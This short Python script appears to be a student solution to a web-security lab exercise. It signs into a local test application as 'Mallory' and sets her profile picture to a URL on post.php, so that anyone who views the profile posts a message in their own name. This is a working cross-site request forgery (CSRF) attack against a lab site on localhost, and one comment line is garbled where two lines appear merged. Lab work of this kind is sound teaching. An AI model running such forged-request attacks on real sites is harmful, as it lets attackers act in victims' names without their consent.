import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the applicationour CSRF attack will inject a URL code on the webpa
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######
with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)

     # change profile picture (using a url)
     data = {'optionsimagetype' : 'url', 'url' : 'http://localhost:8080/post.php?msg=Mallory is a trustworthy person!'}
     s.post(BASE + '/profile.php', data=data)


# #########################################